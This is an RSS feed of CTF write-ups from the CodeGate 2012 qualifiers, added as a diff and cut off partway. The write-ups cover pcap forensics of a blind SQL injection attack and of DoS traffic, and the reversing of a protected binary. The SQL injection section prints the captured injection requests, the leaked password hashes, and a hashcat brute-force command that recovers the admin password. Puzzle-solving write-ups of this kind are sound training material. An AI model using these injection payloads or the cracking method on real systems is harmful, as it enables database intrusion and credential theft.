@@ -1,0 +1,2012 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+   	<title>RealJenius.com - Tag: codegate</title>
+   
+   <link>http://realjenius.com</link>
+   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
+   <language>en-us</language>
+   <managingEditor>R.J. Lorimer</managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+  <title>CodeGate 2012 Quals &#8211; Network 400</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2012-03-01T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html</guid>
+  <description><![CDATA[
+     <p><strong>Challenge</strong></p>
+
+<blockquote>
+  <p>Because of vulnerability of site in Company A, database which contains user’s information was leaked. The file is dumped packet at the moment of attacking.<br />
+Find the administrator’s account information which was leaked from the site.<br />
+For reference, some parts of the packet was blind to XXXX.</p>
+
+  <table>
+    <tbody>
+      <tr>
+        <td>Answer : strupr(md5(database_name</td>
+        <td>table_name</td>
+        <td>decode(password_of_admin)))</td>
+      </tr>
+      <tr>
+        <td>(‘</td>
+        <td>’is just a character)</td>
+        <td> </td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p><a href="http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7">http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7</a></p>
+
+<p><strong>Summary</strong></p>
+
+<p>Given a pcap file (again) captured from an attack, we need to find information about database name, table name, administrator’s password in plaintext.<br />
+This challenge requires basic network analysis skill, some knowledge of Blind SQL Injection and password recovery tools.</p>
+
+<p><strong>Solution</strong></p>
+
+<p>Browsing the pcap file using wireshark, this is obviously a Blind SQL Injection attack.</p>
+
+<pre class="brush: plain; gutter: false; highlight: [1,15,19,33]; title: ; notranslate" title="">GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavyy HTTP/1.1
+Accept-Encoding: identity
+Accept-Language: en-us,en;q=0.5
+Host: www.cdgate.xxx
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
+Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Wed, 22 Feb 2012 09:01:54 GMT
+Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
+X-Powered-By: PHP/5.2.6-2ubuntu4.1
+Vary: Accept-Encoding
+Content-Length: 0
+Connection: close
+Content-Type: text/html
+
+GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavy HTTP/1.1
+Accept-Encoding: identity
+Accept-Language: en-us,en;q=0.5
+Host: www.cdgate.xxx
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
+Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Wed, 22 Feb 2012 09:01:54 GMT
+Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
+X-Powered-By: PHP/5.2.6-2ubuntu4.1
+Vary: Accept-Encoding
+Content-Length: 4
+Connection: close
+Content-Type: text/html
+</pre>
+
+<p>Some first requests are just for checking the responses of server to some random injected queries. We can easily notice that if the expressions in injected queries return False, HTTP response will have <strong>“Content-Length: 0”</strong>, otherwise the expressions return True. Another thing is that all the attacking queries had the same pattern of <strong>… [EXPRESSION] &gt; [VALUE] …</strong> As the operators were all ‘&gt;’, for each [EXPRESSION] we only need to catch the last [VALUE] of ‘False’ responses.</p>
+
+<p>We created a python script to parse this pcap file:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">import sys
+from scapy.all import *
+import urllib, string
+
+packets = rdpcap("network400")
+len_packets = len(packets)
+l1 = []
+l2 = []
+i = 0
+while i &lt; len_packets:
+    if 'Raw' in packets[i] and packets[i].payload.dst == '192.168.1.41':
+        l1.append(urllib.unquote(str(packets[i]['Raw']).split("r")[0]))
+        while True:
+            i+=1
+            if 'Raw' in packets[i]:
+                if packets[i].payload.dst == '192.168.1.8':
+                    content = str(packets[i]['Raw'])
+                    if 'Content-Length: 0' in content:
+                        l2.append(False)
+                    else:
+                        l2.append(True)
+                    break
+    i+=1
+for i in range(len(l1)):
+    print l1[i]
+    print l2[i]
+</pre>
+
+<p>Here’s a part of the output:</p>
+
+<blockquote>
+  <p>…<br />
+GET /sc/id_check.php?name=music’ AND CONNECTION_ID()=CONNECTION_ID() AND ‘YOxWw’=’YOxWw HTTP/1.1<br />
+True<br />
+GET /sc/id_check.php?name=music’ AND ISNULL(1/0) AND ‘wSwEm’=’wSwEm HTTP/1.1<br />
+True<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+True<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 54 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+True<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 56 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 55 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 48 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 1 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 51 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
+False<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 48 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
+True<br />
+GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 49 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
+True<br />
+…</p>
+</blockquote>
+
+<p>We extended the script to print out only the leaked characters</p>
+
+<pre class="brush: python; title: ; notranslate" title="">import sys
+from scapy.all import *
+import urllib
+packets = rdpcap("network400")
+len_packets = len(packets)
+
+cur_s = None
+last_false_value = None
+result = ""
+i=0
+while i &lt; len_packets:
+    if ('Raw' in packets[i]) and (packets[i].payload.dst == '192.168.1.41'):
+        query = urllib.unquote(str(packets[i]['Raw']).split("r")[0])
+        if "&gt;" in query:
+            s,v = query.split("&gt;")
+            v=chr(int(v.strip().split(" ")[0]))
+            if cur_s != s and last_false_value != None:
+                result+= last_false_value
+            cur_s = s
+        else:
+            v = None
+        while True:
+            i+=1
+            if 'Raw' in packets[i]:
+                if packets[i].payload.dst == '192.168.1.8':
+                    content = str(packets[i]['Raw'])
+                    if 'Content-Length: 0' in content:
+                        last_false_value = v
+                    break
+
+    i+=1
+print result
+</pre>
+
+<p>The output looks better (but lack of information about queries):</p>
+
+<pre class="brush: plain; gutter: false; highlight: [82,83,84,85,86,87]; title: ; notranslate" title="">2
+information_schema
+cdgate
+17
+CHARACTER_SETS
+COLLATIONS
+COLLATION_CHARACTER_SET_APPLICABILITY
+COLUMNS
+COLUMN_PRIVILEGES
+KEY_COLUMN_USAGE
+PROFILING
+ROUTINES
+SCHEMATA
+SCHEMA_PRIVILEGES
+STATISTICS
+TABLES
+TABLE_CONSTRAINTS
+TABLE_PRIVILEGES
+TRIGGERS
+USER_PRIVILEGES
+VIEWS
+1
+member
+3
+cdgate
+6
+name
+id
+email
+sex
+level
+passwd
+11
+monitor@cdgate.xxx
+08b5411f848a2581a41672a759c87380
+2
+monitor
+*1763CA06A6BF4E96A671D674E855043A9C7886B2
+f
+apple@cdgate.xxx
+apple
+3
+apple
+*C5404E97FF933A91C48743E0C4063B2774F052DD
+m
+music@cdgate.xxx
+music
+6
+music
+*DBA29A581E9689455787B273C91D77F03D7FAD5B
+m
+computer@cdgate.xxx
+computer
+2
+computer
+*8E4ADF66627261AC0DE1733F55C7A0B72EC113FB
+f
+com@cdgate.xxx
+com
+3
+com
+*FDDA9468184E298A054803261A4753FF4657E889
+f
+lyco@cdgate.xxx
+lynco
+4
+*EEFD19E63FA33259154630DE24A2B17772FAC630
+*0ECBFBFE8116C7612A537E558FB7BE1293576B78
+f
+mouse@cdgate.xxx
+mouse
+4
+*87A5750BB01F1E52060CF8EC90FB1344B1D413AA
+*6FF638106693EF27772523B0D5C9BFAF4DD292F1
+m
+root@cdgate.xxx
+root
+6
+root
+*300102BEB9E4DABEB8BD60BB9BB6686A6272C787
+f
+desktop@cdgate.xxx
+desktop
+1
+desktop
+*DDD9B83818DB7B634C88AD49396F54BD0DE31677
+f
+www@cdgate.xxx
+4eae35f1b35977a00ebd8086c259d4c9
+8
+www
+*3E8563E916A490A13918AF7385B8FF865C221039
+f
+notebook@cdgate.xxx
+notebook
+8
+fb5d1b4a2312e239652b13a24ed9a74f
+*18DF7FA3EE218ACB28E69AF1D643091052A95887
+m
+</pre>
+
+<p>By combining outputs of these 2 scripts we could see that database is <strong>cdgate</strong> and table name is <strong>member</strong>. These information were followed by a number of member records, the value for each record were in order of email, id, level, name, password, sex. There was only one user desktop@cdgate.xxx with level=1, the password was hashed hence we let hashcat do the rest:</p>
+
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">$ echo DDD9B83818DB7B634C88AD49396F54BD0DE31677 &gt; hash
+$ ./hashcat-cli64.bin -m300 -a3 --bf-cs-buf=abcdefghijklmnopqrstuvwxyz0123456789 hash outdir
+................
+Charset...: abcdefghijklmnopqrstuvwxyz0123456789
+Length....: 6
+Index.....: 0/1 (segment), 2176782336 (words), 0 (bytes)
+Recovered.: 0/1 hashes, 0/1 salts
+Speed/sec.: - plains, 13.99M words
+Progress..: 1360425204/2176782336 (62.50%)
+Running...: 00:00:01:37
+Estimated.: 00:00:00:58
+ddd9b83818db7b634c88ad49396f54bd0de31677:etagcd
+All hashes have been recovered
+</pre>
+
+<p>Bingo! The password is <strong>etagcd</strong>, it’s time to build the flag:</p>
+
+<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&gt;&gt;&gt; hashlib.md5('cdgate|member|etagcd').hexdigest().upper();
+'AB6FCA7FFC88710CFBC37D5DF9A25F3F'
+</pre>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Codegate 2012 Quals &#8211; Network 200</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-200.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2012-03-01T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-200.html</guid>
+  <description><![CDATA[
+     <p><strong>Challenge</strong></p>
+
+<blockquote>
+  <p>To whom it may concern to DoS attack.<br />
+What is the different between attack and normal traffic?<br />
+Attached PCAP file is from suspicious client PC which may be infected.<br />
+If you find TOP 4 targeting address, let me know exactly information such as below.<br />
+Answer:<br />
+COUNTRY_NAME_TOP1(3)COUNTRY_NAME_TOP2(13)COUNTRY_NAME_TOP3(2)COUNTRY_NAME_TOP4(5)_1.1.1.1_2.2.2.2_3.3.3.3_4.4.4.4 </p>
+</blockquote>
+
+<p><a href="http://repo.shell-storm.org/CTF/CodeGate-2012/Network200/A565CF2670A7D77603136B69BF93EA45">http://repo.shell-storm.org/CTF/CodeGate-2012/Network200/A565CF2670A7D77603136B69BF93EA45</a></p>
+
+<p><strong>Summary</strong><br />
+Given a pcap file, our task is to find top 4 targeting addresses of a DoS attack. This challenge requires network analysis skill with some experiences of DoS attack.</p>
+
+<p><strong>Solution</strong></p>
+
+<p>We wrote a small python script to generate the statistics of packets:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">from scapy.all import *
+import operator
+packets = rdpcap("network200")
+stats = {}
+for packet in packets:
+    try:
+        dst = packet.payload.dst
+        if dst not in stats: stats[dst] = 0
+        stats[dst] += 1
+    except:
+        pass
+for k,v in sorted(stats.iteritems(), key=operator.itemgetter(1))[::-1]:
+    print k,v
+</pre>
+
+<p>Here’s a part of output:</p>
+
+<blockquote>
+  <p>111.221.70.11 52620<br />
+1.2.3.4 12670<br />
+109.123.118.42 2960<br />
+174.35.40.44 637<br />
+220.73.139.203 452<br />
+123.214.170.56 375<br />
+199.7.48.190 311<br />
+220.73.139.201 280<br />
+8.8.8.8 248<br />
+74.125.71.94 208<br />
+208.46.163.42 186<br />
+175.158.10.55 146<br />
+174.35.40.43 145<br />
+74.125.71.120 120<br />
+74.125.71.104 116<br />
+69.171.234.16 103<br />
+66.150.14.48 99<br />
+61.110.213.19 94<br />
+184.28.147.55 84<br />
+174.35.40.45 82<br />
+110.45.229.135 82<br />
+199.59.149.232 79<br />
+61.106.27.72 77<br />
+184.169.76.33 68<br />
+74.125.71.157 62<br />
+211.174.53.236 56<br />
+174.35.40.6 55<br />
+208.94.0.38 54<br />
+… </p>
+</blockquote>
+
+<p>Then we checked one by one from the top of our list using WireShark:</p>
+
+<ul>
+  <li>111.221.70.11 is obviously under SYN flood attack.</li>
+  <li>109.123.118.42 is flooded by HTTP GET requests.</li>
+  <li>199.7.48.190 is under RUDY attack (POST requests with very large Content-Length).</li>
+  <li>66.150.14.48 has some abnormal HTTP Requests.</li>
+</ul>
+
+<p>Using ip2location.com, we got the country names in respective order:</p>
+
+<ul>
+  <li>Singapore</li>
+  <li>United Kingdom</li>
+  <li>United States</li>
+  <li>United States</li>
+</ul>
+
+<p>FLAG: <strong>none_111.221.70.11_109.123.118.42_199.7.48.190_66.150.14.48</strong></p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2012 Quals bin500 writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate2012-bin500-write-up.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2012-02-28T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate2012-bin500-write-up.html</guid>
+  <description><![CDATA[
+     <p>Thanks to Deroko and some ARTeam members to play with CLGT. Below is the write up by Deroko posted on <a href="http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin500">http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin500</a></p>
+
+<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+  <span id="CodeGate2012_bin500">CodeGate2012 bin500</span>
+</h3>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Challenge: <strong>Seeing that it is not all. </strong><br /> Link to challenge: <a rel="nofollow" href="http://deroko.phearless.org/codegate2012/bin/bin500.zip">http://deroko.phearless.org/codegate2012/bin/bin500.zip</a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  This binary is double ReWolf vm, and python script for modified Olly by Immunity.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Script which comes with binary uses <strong>marshal.loads</strong> to load already compiled pyc code which was produced with <strong>marshal.dump</strong>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  To get .pyc back we need to make some modification to our script:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Modifiedscript.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/1/14/Modifiedscript.png" alt="Modifiedscript.png" width="766" height="300" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Now <strong>C:test.pyc</strong> will have dump of python bytecode.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  If you look carefully through script, some strings might look like a clue:
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white">readMemory
+getRegs
+EIP
+Nice work<span style="color: #339933">,</span> Key1 <span style="color: #339933">:</span>
+But<span style="color: #339933">,</span> Find Next Key!
+Nice work<span style="color: #339933">,</span> Key2 <span style="color: #339933">:</span>
+Input Key <span style="color: #339933">:</span> Key1 <span style="color: #339933">+</span> Key2
+<span style="font-weight: bold">Nothing</span> Found <span style="color: #339933">...</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So this script will probably try to read from current EIP some bytes (readMemory + EIP are good hint), and make key out of it. After modifying <strong>test.pyc</strong> to have proper layout:
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">00000000</span>  <span style="color: #0000ff">03</span> f3 0d 0a dc <span style="font-weight: bold">dd</span> e2 4c  <span style="color: #0000ff">63</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span>  |<span style="color: #339933">.......</span>Lc<span style="color: #339933">.......</span>|
+<span style="color: #adadad;font-style: italic">00000010</span>  <span style="color: #0000ff">00</span> <span style="color: #0000ff">02</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">40</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span>  <span style="color: #0000ff">00</span> <span style="color: #0000ff">73</span> <span style="color: #0000ff">22</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">64</span> <span style="color: #0000ff">00</span>  |<span style="color: #339933">.....</span>@<span style="color: #339933">...</span>s<span style="color: #7f007f">"...d.|
+00000020  00 64 01 00 6c 00 00 5a  00 00 64 02 00 84 00 00  |.d..l..Z..d.....|</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Which is actually <strong>4 bytes for python signature</strong> + <strong>4 bytes for timestamp</strong> +<strong>marshal.dump()</strong> data we get .pyc file which we can decompile.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  For sake of this solution, we will use some simple program to dump python byte-code, and one I found here:<a rel="nofollow" href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html</a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  After disassembling binary with this python script we get (I cut not important parts):
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white">             <span style="color: #0000ff">15</span> LOAD_ATTR                <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>readMemory<span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">18</span> LOAD_CONST               <span style="color: #0000ff">1</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4237456</span><span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">21</span> LOAD_CONST               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">80</span><span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">24</span> CALL_FUNCTION            <span style="color: #0000ff">2</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So from address <strong>40A890</strong> it will read <strong>80</strong> bytes and keep it in internal buffer.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Now comes interesting part when it actually gets keys:
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"> <span style="color: #0000ff">19</span>          <span style="color: #0000ff">54</span> LOAD_FAST                <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span>regs<span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">57</span> LOAD_CONST               <span style="color: #0000ff">3</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #7f007f">'EIP'</span><span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">60</span> BINARY_SUBSCR
+             <span style="color: #0000ff">61</span> LOAD_CONST               <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4273157</span><span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">64</span> COMPARE_OP               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>==<span style="color: #009900;font-weight: bold">)</span>
+             <span style="color: #0000ff">67</span> POP_JUMP_IF_FALSE      <span style="color: #0000ff">161</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  and
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"> <span style="color: #0000ff">23</span>     &gt;&gt;  <span style="color: #0000ff">161</span> LOAD_FAST                <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span>regs<span style="color: #009900;font-weight: bold">)</span>
+            <span style="color: #0000ff">164</span> LOAD_CONST               <span style="color: #0000ff">3</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #7f007f">'EIP'</span><span style="color: #009900;font-weight: bold">)</span>
+            <span style="color: #0000ff">167</span> BINARY_SUBSCR
+            <span style="color: #0000ff">168</span> LOAD_CONST              <span style="color: #0000ff">15</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4278021</span><span style="color: #009900;font-weight: bold">)</span>
+            <span style="color: #0000ff">171</span> COMPARE_OP               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>==<span style="color: #009900;font-weight: bold">)</span>
+            <span style="color: #0000ff">174</span> POP_JUMP_IF_FALSE      <span style="color: #0000ff">276</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  If you look at <strong>out.txt</strong> (in attachment) you may also see what&#8217;s read from where as this python script is not complicated, and python byte code is quite easy to understand.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So just set EIP to be <strong>413405</strong> and run script, and you will get 1st key. Then set EIP to be <strong>414705</strong> and run scrip again. If you did, everything correct you should see in Log of Immunity Debugger this:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Key.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/5/52/Key.png" alt="Key.png" width="291" height="51" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So final key is <strong>Never_up_N3v3r_1n</strong>
+</p>
+
+<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+  <span id="Greetings">Greetings</span>
+</h3>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  I would like to say tnx to my <strong>ARTeam</strong> mates, <strong>vnsecurity</strong> guys, and <strong>rd</strong> , and of course to <strong>superkhung</strong> for listening to my random blabing on skype during CTF :)
+</p>
+
+<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+  <span id="Author">Author</span>
+</h3>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <strong>deroko of ARTeam</strong>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+    <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+</p></p></p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2012 Quals bin400 writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate-2012-quals-bin400-writeup.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2012-02-28T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate-2012-quals-bin400-writeup.html</guid>
+  <description><![CDATA[
+     <p><span style="color: #222222;font-family: 'Lucida Grande', Arial, Tahoma, Verdana, sans-serif;font-size: 13px;line-height: 18px">Thanks to Deroko and some ARTeam members to play with CLGT. Below is the write up by Deroko posted on <a href="http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin400">http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin400</a></span></p>
+
+<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+  <span id="CodeGate2012_bin400">CodeGate2012 bin400</span>
+</h3>
+
